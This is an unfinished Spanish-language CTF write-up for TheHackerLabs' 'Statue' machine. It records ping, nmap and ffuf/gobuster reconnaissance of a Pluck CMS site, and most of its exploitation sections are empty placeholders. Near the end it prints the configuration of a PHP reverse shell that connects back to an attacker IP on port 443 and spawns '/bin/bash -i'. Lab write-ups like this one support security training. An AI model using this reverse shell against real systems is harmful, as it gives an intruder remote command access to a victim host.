---
layout: single
title: Statue - TheHackerLabs
excerpt: "."
date: 2025-06-10
classes: wide
header:
  teaser: /assets/images/THL-writeup-statue/statue.jpg
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Easy Machine
tags:
  - Linux
  - 
  - 
  - OSCP Style
---
![](/assets/images/THL-writeup-statue/statue.jpg)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.82
PING 192.168.100.82 (192.168.100.82) 56(84) bytes of data.
64 bytes from 192.168.100.82: icmp_seq=1 ttl=64 time=2.47 ms
64 bytes from 192.168.100.82: icmp_seq=2 ttl=64 time=1.22 ms
64 bytes from 192.168.100.82: icmp_seq=3 ttl=64 time=0.857 ms
64 bytes from 192.168.100.82: icmp_seq=4 ttl=64 time=1.31 ms

--- 192.168.100.82 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3194ms
rtt min/avg/max/mdev = 0.857/1.461/2.466/0.603 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 12:35 CST
Initiating ARP Ping Scan at 12:35
Scanning 192.168.10.100 [1 port]
Completed ARP Ping Scan at 12:35, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:35
Scanning 192.168.10.100 [65535 ports]
Discovered open port 22/tcp on 192.168.10.100
Discovered open port 80/tcp on 192.168.10.100
Completed SYN Stealth Scan at 12:35, 15.40s elapsed (65535 total ports)
Nmap scan report for 192.168.10.100
Host is up, received arp-response (0.0013s latency).
Scanned at 2025-06-10 12:35:02 CST for 16s
Not shown: 63517 closed tcp ports (reset), 2016 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds
           Raw packets sent: 73798 (3.247MB) | Rcvd: 63520 (2.541MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay dos puertos abiertos, supongo que la intrusión será por la página web activa del **puerto 80**.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 22,80 192.168.10.100 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 12:35 CST
Nmap scan report for 192.168.10.100
Host is up (0.00083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c2:ac:cf:d7:65:58:4b:cf:a2:a1:cd:ff:db:25:b7:79 (ECDSA)
|_  256 e4:4a:ab:9d:d8:7b:8c:d9:6c:6c:9a:52:85:70:b4:8d (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Index of /
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 192.168.10.100; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Curiosamente, no esta reportando nada la página web y si vamos a verla, no encontraremos contenido:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura1.png">
</p>

Es posible que se este aplicando **Virtual Hosting**.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Normalmente, el dominio que se ocupa como **Virtual Hosting** es: `<nombre_máquina>.thl`

Vamos a comprobarlo, registrandolo en el `/etc/hosts`:
```bash
nano /etc/hosts
--------------------
192.168.10.100 statue.thl
```

Visitemos la página web usando ese dominio:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura2.png">
</p>

Funcionó.

Podemos ver que se esta utilizando el **CMS Pluck**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura11.png">
</p>

Solamente se destaca que se usa el **lenguaje PHP**.

En la URL, vemos que se esta utilizando el parámetro `?file=`, podríamos probar si es vulnerable a **LFI**, pero al intentarlo ocurre lo siguiente:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura3.png">
</p>

Si seleccionamos el botón **admin** que se ve cerca de **pluck**, nos llevara al login del **usuario admin**:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura4.png">
</p>

Ahí mismo, vemos la versión de **Pluck** que se esta utilizando, siendo la **versión 4.7.18**. Además, si revisamos el código fuente de la página principal, veremos también la versión de **Pluck** utilizada:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura12.png">
</p>

De ahí en fuera, no encontramos algo más.

Antes de investigar si hay un Exploit para esta versión de **Pluck**, vamos a aplicar **Fuzzing** para ver que podemos encontrar.

<br>

<h2 id="fuzz">Fuzzing</h2>

Primero, probemos con **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://statue.thl/FUZZ -t 300 -e .php,.txt,.html,.cgi,.md

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://statue.thl/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Extensions       : .php .txt .html .cgi .md 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 10ms]
index.php               [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 144ms]
login.php               [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
templates               [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 115ms]
data                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 43ms]
admin.php               [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 81ms]
plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 34ms]
install.php             [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
README.md               [Status: 200, Size: 2922, Words: 1, Lines: 39, Duration: 9ms]
javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 52ms]
robots.txt              [Status: 200, Size: 47, Words: 4, Lines: 3, Duration: 80ms]
requirements.php        [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 57ms]
docs                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 6392ms]
files                   [Status: 500, Size: 613, Words: 65, Lines: 17, Duration: 8510ms]
SECURITY.md             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5922ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 48ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 49ms]
                        [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 48ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 23ms]
:: Progress: [7642908/7642908] :: Job [1/1] :: 269 req/sec :: Duration: [0:48:50] :: Errors: 9 ::
```

| Parámetros | Descripción |
|--------------------------|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-e*       | Para indicar extensiones de archivos a buscar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

<br>

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://statue.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 300 -x html,php,txt,cgi,md
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://statue.thl/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,cgi,md,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 302) [Size: 0] [--> http://statue.thl/?file=rodgar]
/.php                 (Status: 403) [Size: 275]
/images               (Status: 301) [Size: 309] [--> http://statue.thl/images/]
/login.php            (Status: 200) [Size: 1242]
/files                (Status: 500) [Size: 613]
/templates            (Status: 301) [Size: 312] [--> http://statue.thl/templates/]
/data                 (Status: 301) [Size: 307] [--> http://statue.thl/data/]
/admin.php            (Status: 200) [Size: 3733]
/plugins              (Status: 301) [Size: 310] [--> http://statue.thl/plugins/]
/docs                 (Status: 301) [Size: 307] [--> http://statue.thl/docs/]
/install.php          (Status: 200) [Size: 3742]
/README.md            (Status: 200) [Size: 2922]
/javascript           (Status: 301) [Size: 313] [--> http://statue.thl/javascript/]
/robots.txt           (Status: 200) [Size: 47]
/requirements.php     (Status: 200) [Size: 3754]
/SECURITY.md          (Status: 200) [Size: 0]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 7642992 / 7642998 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar extensiones de archivos a buscar. |

<br>

Hay varios archivos que podemos visitar, pero el que tiene algo interesante, es el archivo **README.md**.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="base64">Decodificando Contraseña en base64 y Ganado Acceso al Login de Pluck</h2>


```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```



```bash
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.100.250';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;
```


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```




<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
